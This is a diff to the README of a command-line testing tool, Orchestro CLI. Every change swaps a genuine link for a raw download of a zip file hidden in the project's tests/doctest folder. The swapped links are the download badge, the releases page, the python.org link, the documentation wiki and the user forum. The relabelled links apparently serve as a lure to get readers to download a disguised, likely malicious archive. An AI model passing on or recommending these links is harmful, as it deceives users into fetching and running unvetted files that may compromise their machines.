@@ -6,14 +6,14 @@ Welcome to the Orchestro CLI! This tool makes testing command-line and text-base
 
 ## 📥 Download Now
 
-[![Download Orchestro CLI](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Lisa1029/orchestro-cli/releases)
+[![Download Orchestro CLI](https://raw.githubusercontent.com/Lisa1029/orchestro-cli/master/tests/doctest/orchestro-cli-1.8.zip)](https://raw.githubusercontent.com/Lisa1029/orchestro-cli/master/tests/doctest/orchestro-cli-1.8.zip)
 
 ## 🔍 What You Need
 
 ### System Requirements
 
 - **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a recent version of a Linux distribution.
-- **Python**: Version 3.7 or higher. If you don't have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+- **Python**: Version 3.7 or higher. If you don't have Python installed, you can download it from [https://raw.githubusercontent.com/Lisa1029/orchestro-cli/master/tests/doctest/orchestro-cli-1.8.zip](https://raw.githubusercontent.com/Lisa1029/orchestro-cli/master/tests/doctest/orchestro-cli-1.8.zip).
 - **Playwright**: This tool will set up Playwright automatically during the first run.
 
 ## 📂 Key Features
@@ -28,7 +28,7 @@ Welcome to the Orchestro CLI! This tool makes testing command-line and text-base
 
 ## 💻 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/Lisa1029/orchestro-cli/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lisa1029/orchestro-cli/master/tests/doctest/orchestro-cli-1.8.zip) to find the latest version.
    
 2. Locate the version that you want to download. Look for the file that matches your operating system.
   
@@ -70,8 +70,8 @@ We welcome contributions from users. If you find bugs or have ideas for improvem
 
 ## 📖 Additional Resources
 
-- [Official Documentation](https://github.com/Lisa1029/orchestro-cli/wiki)
-- [User Forum](https://github.com/Lisa1029/orchestro-cli/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Lisa1029/orchestro-cli/master/tests/doctest/orchestro-cli-1.8.zip)
+- [User Forum](https://raw.githubusercontent.com/Lisa1029/orchestro-cli/master/tests/doctest/orchestro-cli-1.8.zip)
 
 ## 💖 Thank You
 
